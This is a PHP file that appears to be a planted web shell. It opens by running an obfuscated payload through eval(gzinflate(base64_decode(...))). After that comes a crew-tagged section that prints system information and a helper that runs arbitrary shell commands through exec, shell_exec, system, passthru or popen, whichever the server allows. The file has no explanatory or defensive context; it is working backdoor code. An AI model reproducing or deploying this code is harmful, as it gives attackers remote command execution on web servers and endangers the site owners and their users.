<?php
$code="pZJda8IwFIbvBf9DDEITEHEfV3OOwv7GINT0xGa0SclJp0X870vSVncheLG78n485yV0PgNZWUJ/Nu2nezm+790H3c5HEXt8o+u2akVnigYYX9MpsJRNuaMpZux+U/axnQxAOHQ62nBiMcYn3s0KynymOiO9toaknAJ+Dm0HSHYky0JCK8IW0LS+H+zoa8WmmoCTRo8sgxPILLl5/EzhVQTFwyPw22rD6JehV+MSRtUI94BYQV2LG3Zk5Dd9GPSA0qOHZhxm9wJ94TyLpXywrpCJH0IH8EJa48EERMoGEUwpZA2FYQ9OtgWir1x39+hk/vtsrlGEqu2cBLZUEdHaFszw8NRR/vfVaPwpjpWugS1yBVaFCufkTJK/DmXloCiDunraPL/yLbnEsbK2GOnpdFAc+M6ZVBrG/AI=";
eval(gzinflate(base64_decode($code)));
exit;


echo "v0pCr3w<br>";
echo "sys:".php_uname()."<br>";
$cmd="echo nob0dyCr3w";
$eseguicmd=ex($cmd);
echo $eseguicmd;

function ex($cfe){
$res = '';
if (!empty($cfe)){
if(function_exists('exec')){
@exec($cfe,$res);
$res = join("\n",$res);
}
elseif(function_exists('shell_exec')){
$res = @shell_exec($cfe);
}
elseif(function_exists('system')){
@ob_start();
@system($cfe);
$res = @ob_get_contents();
@ob_end_clean();
}
elseif(function_exists('passthru')){
@ob_start();
@passthru($cfe);
$res = @ob_get_contents();
@ob_end_clean();
}
elseif(@is_resource($f = @popen($cfe,"r"))){
$res = "";
while(!@feof($f)) { $res .= @fread($f,1024); }
@pclose($f);
}}
return $res;
}

